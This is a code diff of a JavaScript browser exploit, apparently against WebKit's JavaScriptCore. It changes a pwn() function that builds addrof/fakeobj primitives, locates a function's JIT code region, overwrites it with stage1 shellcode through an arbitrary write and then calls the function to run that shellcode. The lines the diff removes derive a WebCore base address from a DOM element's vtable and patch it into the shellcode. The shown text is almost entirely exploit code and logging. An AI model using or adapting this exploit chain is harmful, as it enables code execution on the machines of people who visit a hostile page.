@@ -348,46 +348,21 @@ function pwn() {
     let myOBJ = {a: 0x1337};
     let myOBJAddr = addrof(myOBJ);
     log(`[*] myOBJAddr = ${(myOBJAddr).toString(16)}`);
-
     let fakeOBJ = fakeobj(myOBJAddr);
     log(`[*] fakeOBJ = ${(fakeOBJ.a).toString(16)}`);
-
     let myOBJ2 = {b: 0x4141};
     let myOBJAddr2 = addrof(myOBJ2);
     log(`[*] myOBJAddr2 = ${(myOBJAddr2).toString(16)}`);
-
     let fakeOBJ2 = fakeobj(myOBJAddr2);
     log(`[*] fakeOBJ2 = ${(fakeOBJ2.b).toString(16)}`);
-
-    var spectre = (typeof SharedArrayBuffer !== 'undefined');
-    var FPO = spectre ? 0x18 : 0x10;
-    log(`[*] FPO: ${FPO.toString(16)}`);
-
-    var wrapper = document.createElement('div');
-    var wrapper_addr = addrof(wrapper);
-    log(`[*] wrapper_addr = ${(wrapper_addr).toString(16)}`);
-    var el_addr = read64(wrapper_addr + FPO);
-    log(`[*] el_addr = ${(el_addr).toString(16)}`);
-    var vtab_addr = read64(el_addr);
-    log(`[*] vtab_addr = ${(vtab_addr).toString(16)}`);
-
     var shellcodeFuncAddr = addrof(shellcodeFunc);
     log(`[+] Shellcode function @ ${shellcodeFuncAddr.toString(16)}`);
-
     var executableAddr = read64(shellcodeFuncAddr + 24);
     log(`[+] Executable instance @ ${executableAddr.toString(16)}`);
-
     var jitCodeAddr = read64(executableAddr + 8);
     log(`[+] JITCode instance @ ${jitCodeAddr.toString(16)}`);
-
     var JITCode = read64(jitCodeAddr + 0x1a8);
     log(`[+] JITCode @ ${JITCode.toString(16)}`);
-
-    var webcore_base = vtab_addr - (0x1921f45c6 - 0x190045000);
-    log(`[+] webcore base = ${(webcore_base).toString(16)}`);
-    var read_webcore = read64(webcore_base);
-    log(`[i] webcore read test = ${read_webcore.toString(16)}`);
-
     let hexdump = function(buf) {
         let arr = new Uint8Array(buf);
         let str = "";
@@ -396,17 +371,9 @@ function pwn() {
         }
         return str;
     }
-
     log(`[*] hexdump(stage1): ${hexdump(stage1)}`);
-
-    stage1.replace(new Int64("0xbadbad10badbad10"), new Int64(webcore_base));
-    log(`[*] hexdump(stage1): ${hexdump(stage1)}`);
-
     ArbitraryWrite(JITCode, stage1);
-
     log(`[*] Executing stage1`);
-
     shellcodeFunc();
-
     log(`[*] Stage1 returned`);
 }
